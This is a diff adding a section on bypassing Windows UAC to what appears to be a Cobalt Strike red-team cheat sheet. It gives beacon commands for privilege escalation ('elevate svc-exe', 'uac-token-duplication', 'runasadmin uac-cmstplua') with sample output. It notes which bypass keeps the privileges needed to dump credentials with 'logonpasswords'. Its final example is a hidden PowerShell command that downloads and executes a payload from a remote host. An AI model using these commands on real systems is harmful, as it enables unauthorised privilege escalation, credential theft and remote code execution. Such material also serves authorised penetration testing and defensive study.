@@ -367,3 +367,68 @@ beacon> jobs
 
 beacon> jobkill 1
 ```
+
+
+# Bypass UAC
+
+In cobalt strike there are two automatic ways to bypass UAC, with `elevate` and `runasadmin`.
+
+
+## Elevate Command
+
+`elevate` command has two exploits, using Service Control Manager or via token duplication.
+
+```
+beacon> elevate
+
+Beacon Local Exploits
+=====================
+
+    Exploit                         Description
+    -------                         -----------
+    svc-exe                         Get SYSTEM via an executable run as a service
+    uac-token-duplication           Bypass UAC with Token Duplication
+```
+
+Not all UAC bypasses are created equal, and does not have same `TokenPrivileges`.
+
+### svc-exe
+
+```
+beacon> elevate svc-exe listener-4444-tcp
+Started service 96d2381 on .
+[+] established link to child beacon: 10.10.10.10
+```
+> **Note**: The beacon obtained with `svc-exe` bypass will have the necessary token privileges to run post-ex commands such as `logonpasswords`.
+
+### uac-token-duplication
+
+```
+beacon> elevate uac-token-duplication listener-4444-tcp
+Started service 96d2381 on .
+[+] established link to child beacon: 10.10.10.10
+```
+> **Note**: The beacon obtained with `uac-token-duplicatio` bypass is limited and some post-ex command such as `logonpasswords` will fail due to the lack of some TokenPrivileges.
+
+## Runasadmin Command
+
+With `runasadmin` command we can execute a high privilege command. Like `elevate` has some exploits.
+
+
+```
+beacon> runasadmin
+
+Beacon Command Elevators
+========================
+
+    Exploit                         Description
+    -------                         -----------
+    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
+    uac-token-duplication           Bypass UAC with Token Duplication
+```
+
+Example:
+
+```
+beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/b'))"
+```
